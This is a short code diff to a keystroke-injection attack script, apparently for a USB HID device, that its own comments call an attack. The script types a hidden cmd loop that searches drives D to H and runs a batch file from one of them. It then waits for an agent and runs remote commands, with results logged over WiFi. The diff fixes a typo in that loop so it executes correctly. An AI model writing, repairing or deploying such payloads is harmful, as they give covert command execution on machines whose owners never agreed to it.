@@ -35,7 +35,7 @@ IF (FILE_EXISTS() == FALSE) THEN
   REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
   REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
 
-  STRING cmd /c @echo off & for %d isn (D E F G H) do if exist %d:
+  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
   RAW_HID 0x64
   STRING in1.bat %d:
   RAW_HID 0x64
@@ -67,4 +67,5 @@ END_WHILE
 
 LOG Agent responded
 REM run a command, to see the results check the log over WiFi
+
 AGENT_RUN dir
